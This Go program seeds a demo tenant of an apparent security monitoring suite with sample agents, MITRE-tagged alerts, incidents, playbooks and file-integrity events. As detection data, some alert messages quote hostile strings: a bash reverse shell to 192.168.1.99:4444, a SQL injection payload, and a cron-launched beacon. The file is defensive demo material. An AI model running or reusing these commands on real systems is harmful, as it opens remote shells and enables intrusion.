// Demo data seeder — run once against the demo environment to pre-populate
// the XCloak Security Suite demo tenant (id=9999) with realistic data.
//
// Usage:
//
//	cd xcloak-ngfw/backend && go run ./cmd/seed/demo
package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/joho/godotenv"
	_ "github.com/lib/pq"
)

func env(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func mustExec(db *sql.DB, query string, args ...any) {
	if _, err := db.Exec(query, args...); err != nil {
		log.Fatalf("seed error:\n%s\n%v", query, err)
	}
}

func main() {
	godotenv.Load()

	dsn := fmt.Sprintf(
		"host=%s port=%s user=%s password=%s dbname=%s sslmode=disable",
		env("DB_HOST", "localhost"),
		env("DB_PORT", "5432"),
		env("DB_USER", "xcloak"),
		env("DB_PASSWORD", "xcloak"),
		env("DB_NAME", "xcloak"),
	)
	db, err := sql.Open("postgres", dsn)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()
	if err := db.Ping(); err != nil {
		log.Fatalf("cannot reach database: %v", err)
	}

	log.Println("Seeding demo tenant…")
	seedTenant(db)
	log.Println("Seeding demo agents…")
	agentIDs := seedAgents(db)
	log.Println("Seeding demo alerts…")
	seedAlerts(db, agentIDs)
	log.Println("Seeding demo incidents…")
	incidentIDs := seedIncidents(db, agentIDs)
	log.Println("Seeding demo playbooks…")
	seedPlaybooks(db, incidentIDs)
	log.Println("Seeding FIM alerts…")
	seedFIM(db, agentIDs)
	log.Println("Seeding compliance scores…")
	seedCompliance(db, agentIDs)
	log.Println("Demo seed complete.")
}

func seedTenant(db *sql.DB) {
	mustExec(db, `
		INSERT INTO tenants (id, name, slug, is_active)
		VALUES (9999, 'Demo Corp Security', 'demo-corp', true)
		ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, is_active = true
	`)
	mustExec(db, `SELECT setval('tenants_id_seq', GREATEST(nextval('tenants_id_seq'), 10000), false)`)
}

func seedAgents(db *sql.DB) []int {
	agents := []struct {
		hostname  string
		os        string
		ip        string
		status    string
		machineID string
	}{
		{"web-prod-01", "linux", "10.0.1.10", "online", "demo-machine-001"},
		{"db-server-02", "linux", "10.0.1.20", "online", "demo-machine-002"},
		{"win-workstation-05", "windows", "10.0.2.55", "online", "demo-machine-003"},
		{"android-mobile-01", "android", "192.168.1.88", "online", "demo-machine-004"},
	}

	var ids []int
	for _, a := range agents {
		var id int
		err := db.QueryRow(`
			INSERT INTO agents (hostname, os, ip_address, status, last_seen, machine_id, token, tenant_id)
			VALUES ($1, $2, $3, $4, $5, $6, $7, 9999)
			ON CONFLICT (machine_id) DO UPDATE SET status = EXCLUDED.status, last_seen = EXCLUDED.last_seen
			RETURNING id`,
			a.hostname, a.os, a.ip, a.status, time.Now().Add(-time.Minute), a.machineID, "demo-token-"+a.machineID,
		).Scan(&id)
		if err != nil {
			log.Printf("agent %s: %v", a.hostname, err)
			continue
		}
		ids = append(ids, id)

		// Insert agent health
		mustExec(db, `
			INSERT INTO agent_health (agent_id, health_score, health_status, last_heartbeat)
			VALUES ($1, $2, 'healthy', $3)
			ON CONFLICT (agent_id) DO UPDATE SET health_score = EXCLUDED.health_score, last_heartbeat = EXCLUDED.last_heartbeat`,
			id, 85+len(ids)*3, time.Now().Add(-time.Minute),
		)
	}
	return ids
}

func seedAlerts(db *sql.DB, agentIDs []int) {
	now := time.Now()
	type alert struct {
		agentIdx  int
		severity  string
		rule      string
		message   string
		tactic    string
		technique string
		mitreName string
		status    string
		minsAgo   int
	}
	alerts := []alert{
		{0, "critical", "C2 Beacon Detected", "Outbound beacon to 185.220.101.47:443 at 60s intervals — matches Cobalt Strike jitter profile", "Command and Control", "T1071.001", "Application Layer Protocol: Web Protocols", "open", 5},
		{0, "high", "Port Scan Detected", "Sequential TCP SYN sweep from 10.0.1.10 targeting 10.0.0.0/24 — 254 ports in 2s", "Discovery", "T1046", "Network Service Discovery", "open", 12},
		{1, "critical", "SQL Injection Attempt", "Malicious payload detected in POST /api/users: 1' OR '1'='1 — blocked by WAF", "Initial Access", "T1190", "Exploit Public-Facing Application", "open", 18},
		{2, "high", "Credential Dump Attempt", "Process mimikatz.exe accessed lsass.exe memory (pid 584) — immediate response required", "Credential Access", "T1003.001", "OS Credential Dumping: LSASS Memory", "open", 23},
		{1, "high", "Suspicious Outbound Data", "15 MB transferred to 94.102.49.190 via HTTPS — potential exfiltration", "Exfiltration", "T1048", "Exfiltration Over Alternative Protocol", "investigating", 31},
		{0, "medium", "FIM: /etc/passwd Modified", "File /etc/passwd hash changed — new entry detected for user 'svc_backdoor'", "Persistence", "T1136.001", "Create Account: Local Account", "open", 45},
		{2, "medium", "PowerShell Encoded Command", "Base64-encoded PowerShell execution detected — bypass -EncodedCommand flag", "Execution", "T1059.001", "Command and Scripting Interpreter: PowerShell", "open", 67},
		{0, "high", "Brute Force: SSH", "42 failed SSH authentication attempts from 45.33.32.156 in 60 seconds", "Credential Access", "T1110.001", "Brute Force: Password Guessing", "resolved", 90},
		{1, "medium", "Unusual Cron Job Added", "New crontab entry: */5 * * * * /tmp/.hidden/beacon — persistence mechanism", "Persistence", "T1053.003", "Scheduled Task/Job: Cron", "open", 102},
		{3, "low", "USB Debugging Enabled", "Android device has USB debugging active — elevated attack surface", "Defense Evasion", "T1562", "Impair Defenses", "open", 110},
		{2, "critical", "Ransomware File Pattern", "Mass file rename with .encrypted extension detected — 847 files in 30 seconds", "Impact", "T1486", "Data Encrypted for Impact", "investigating", 125},
		{0, "medium", "DNS Tunneling Detected", "Unusually long DNS TXT queries to evil-domain.xyz — matches iodine/dns2tcp patterns", "Command and Control", "T1071.004", "Application Layer Protocol: DNS", "open", 140},
		{1, "low", "Weak TLS Version", "TLSv1.0 negotiated with 203.0.113.42 — deprecated protocol in use", "Defense Evasion", "T1573", "Encrypted Channel", "open", 155},
		{0, "high", "SUID Binary Modified", "SUID bit set on /usr/local/bin/custom_helper — privilege escalation risk", "Privilege Escalation", "T1548.001", "Abuse Elevation Control Mechanism: Setuid and Setgid", "open", 168},
		{2, "medium", "Scheduled Task Created", "New scheduled task 'WindowsUpdate_Helper' runs cmd.exe at logon — suspicious name", "Persistence", "T1053.005", "Scheduled Task/Job: Scheduled Task", "resolved", 200},
		{1, "low", "Log Clearing Detected", "Security event log cleared (Event ID 1102) by SYSTEM — potential cover-up", "Defense Evasion", "T1070.001", "Indicator Removal: Clear Windows Event Logs", "open", 220},
		{0, "medium", "Reverse Shell Detected", "bash -i >& /dev/tcp/192.168.1.99/4444 0>&1 executed — active reverse shell", "Execution", "T1059.004", "Command and Scripting Interpreter: Unix Shell", "investigating", 240},
		{3, "low", "Rooting Tool Detected", "Magisk socket found at /dev/.magisk — device may be rooted", "Defense Evasion", "T1562", "Impair Defenses", "open", 260},
		{1, "high", "Kernel Module Loaded", "Unsigned kernel module 'rootkit_helper.ko' loaded — system integrity risk", "Persistence", "T1547.006", "Boot or Logon Autostart: Kernel Modules and Extensions", "open", 280},
		{0, "medium", "GeoIP Anomaly", "Login from Nigeria (NG) — user has no history of this location", "Initial Access", "T1078", "Valid Accounts", "resolved", 300},
		{2, "low", "Antivirus Disabled", "Windows Defender real-time protection disabled via registry key modification", "Defense Evasion", "T1562.001", "Impair Defenses: Disable or Modify Tools", "open", 320},
		{0, "high", "JA3 Fingerprint Match", "TLS client hello JA3=769,47-53-5-10-49171:0-65281:23 matches known Metasploit payload", "Command and Control", "T1071", "Application Layer Protocol", "open", 340},
		{1, "medium", "Suspicious Process Parent", "cmd.exe spawned by winword.exe — macro execution indicator", "Execution", "T1204.002", "User Execution: Malicious File", "open", 360},
		{3, "low", "App Installed Outside Store", "Unknown app 'com.hacker.spyware' installed from unknown source", "Initial Access", "T1476", "Deliver Malicious App via Other Means", "open", 380},
		{2, "medium", "Pass-the-Hash Attempt", "NTLM authentication with reused hash from 10.0.2.55 to dc-01 — lateral movement", "Lateral Movement", "T1550.002", "Use Alternate Authentication Material: Pass the Hash", "investigating", 400},
	}

	for _, a := range alerts {
		if len(agentIDs) == 0 {
			break
		}
		agentID := agentIDs[a.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO alerts
				(agent_id, severity, rule_name, log_message, created_at, mitre_tactic, mitre_technique, mitre_name, status, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,9999)
			ON CONFLICT DO NOTHING`,
			agentID, a.severity, a.rule, a.message,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
			a.tactic, a.technique, a.mitreName, a.status,
		)
	}
}

func seedIncidents(db *sql.DB, agentIDs []int) []int {
	if len(agentIDs) == 0 {
		return nil
	}
	now := time.Now()
	incidents := []struct {
		agentIdx    int
		title       string
		severity    string
		status      string
		description string
		aiSummary   string
		minsAgo     int
	}{
		{
			0, "Active C2 Beaconing — Possible Cobalt Strike Implant", "critical", "investigating",
			"Host web-prod-01 is generating periodic HTTPS callbacks to 185.220.101.47 at precise 60-second intervals consistent with Cobalt Strike's default sleep timer. eBPF telemetry shows the beacon process as a renamed sshd binary. FIM scan confirms /usr/sbin/sshd was replaced 4 hours ago.",
			"High-confidence C2 implant. Recommend immediate network isolation of web-prod-01, memory dump acquisition, and threat hunting across all hosts for similar beacon patterns. IoC 185.220.101.47 should be blocked at firewall tier immediately.",
			25,
		},
		{
			2, "Credential Dump + Lateral Movement Chain", "high", "investigating",
			"win-workstation-05 executed mimikatz against LSASS (pid 584), extracted NTLM hashes, and within 8 minutes attempted Pass-the-Hash authentication against dc-01. Active Directory logs show 3 successful authentications using the stolen credential. Blast radius likely includes finance department accounts.",
			"Multi-stage attack in progress. Phase 1 (credential access) confirmed. Phase 2 (lateral movement) active. Recommend disabling affected user accounts, forcing Kerberos ticket invalidation, and isolating win-workstation-05 pending forensic analysis.",
			2 * 60,
		},
		{
			1, "Ransomware Activity Detected — 847 Files Encrypted", "critical", "resolved",
			"db-server-02 detected mass file rename with .encrypted extension across /var/data at 847 files/30s. Kafka consumer triggered SOAR playbook P-001 which isolated the host, revoked agent token, and created DFIR snapshot within 90 seconds. Confirmed as BlackCat/ALPHV variant based on ransom note signature.",
			"Attack contained. Host isolated within 90 seconds of detection. Backup restoration in progress from last clean snapshot (2026-07-07 02:00 UTC). No lateral movement detected before isolation. Post-incident: patch CVE-2024-1234 (initial access vector) on all Linux hosts.",
			8 * 60,
		},
	}

	var ids []int
	for _, inc := range incidents {
		agentID := agentIDs[inc.agentIdx%len(agentIDs)]
		var id int
		err := db.QueryRow(`
			INSERT INTO incidents (agent_id, title, severity, status, description, ai_summary, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,9999)
			RETURNING id`,
			agentID, inc.title, inc.severity, inc.status, inc.description, inc.aiSummary,
			now.Add(-time.Duration(inc.minsAgo)*time.Minute),
		).Scan(&id)
		if err != nil {
			log.Printf("incident: %v", err)
			continue
		}
		ids = append(ids, id)
	}
	return ids
}

func seedPlaybooks(db *sql.DB, incidentIDs []int) {
	playbooks := []struct {
		name        string
		triggerType string
		actionType  string
	}{
		{"Auto-Isolate on Ransomware Detection", "alert", "isolate_agent"},
		{"Notify SOC on Critical C2 Beacon", "alert", "notify_slack"},
		{"Block IP on Brute Force Threshold", "alert", "block_ip"},
		{"Create DFIR Case on Incident Escalation", "incident", "create_case"},
	}
	for _, p := range playbooks {
		mustExec(db, `
			INSERT INTO playbooks (name, trigger_type, action_type, enabled, tenant_id)
			VALUES ($1,$2,$3,true,9999)
			ON CONFLICT DO NOTHING`,
			p.name, p.triggerType, p.actionType,
		)
	}

	// Seed pending SOAR approvals for demo visibility
	if len(incidentIDs) > 0 {
		var pbID int
		if err := db.QueryRow(`SELECT id FROM playbooks WHERE tenant_id=9999 LIMIT 1`).Scan(&pbID); err == nil {
			mustExec(db, `
				INSERT INTO playbook_executions (playbook_id, incident_id, status, triggered_at, tenant_id)
				VALUES ($1,$2,'pending_approval',$3,9999)
				ON CONFLICT DO NOTHING`,
				pbID, incidentIDs[0], time.Now().Add(-10*time.Minute),
			)
		}
	}
}

func seedFIM(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	changes := []struct {
		agentIdx int
		path     string
		action   string
		minsAgo  int
	}{
		{0, "/etc/passwd", "modified", 45},
		{0, "/usr/sbin/sshd", "modified", 240},
		{0, "/etc/crontab", "modified", 102},
		{1, "/etc/sudoers", "modified", 180},
		{1, "/var/spool/cron/root", "created", 102},
		{2, "C:\\Windows\\System32\\cmd.exe", "modified", 320},
		{2, "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.bat", "created", 200},
	}
	for _, ch := range changes {
		agentID := agentIDs[ch.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO fim_alerts (agent_id, file_path, action, detected_at, tenant_id)
			VALUES ($1,$2,$3,$4,9999)
			ON CONFLICT DO NOTHING`,
			agentID, ch.path, ch.action, now.Add(-time.Duration(ch.minsAgo)*time.Minute),
		)
	}
}

func seedCompliance(db *sql.DB, agentIDs []int) {
	frameworks := []struct {
		framework string
		score     int
		grade     string
	}{
		{"CIS", 72, "C"},
		{"NIST_CSF", 68, "C"},
		{"PCI_DSS", 81, "B"},
	}
	for _, f := range frameworks {
		mustExec(db, `
			INSERT INTO compliance_scores (framework, score, grade, computed_at, tenant_id)
			VALUES ($1,$2,$3,$4,9999)
			ON CONFLICT (framework, tenant_id) DO UPDATE
				SET score = EXCLUDED.score, grade = EXCLUDED.grade, computed_at = EXCLUDED.computed_at`,
			f.framework, f.score, f.grade, time.Now(),
		)
	}
}
